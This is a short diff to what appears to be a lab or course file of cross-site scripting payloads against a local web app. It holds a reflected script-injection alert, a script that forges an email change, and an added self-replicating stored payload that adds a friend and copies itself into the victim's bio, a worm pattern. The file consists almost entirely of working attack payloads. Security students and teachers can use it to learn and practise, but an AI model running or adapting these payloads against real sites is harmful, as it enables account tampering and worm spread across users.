@@ -8,3 +8,8 @@
 http://localhost:8080/search?term=<script>alert("your flag is mine!")</script>
 
 <script>$.post("http://localhost:8080/set-email", {email: "I think I have been hacked"})</script>
+
+<script id="malicious_script">
+    $.get("http://localhost:8080/friend?name=bryan");
+    $.post("http://localhost:8080/set-bio", {bio: document.getElementById('malicious_script').outerHTML})
+</script>
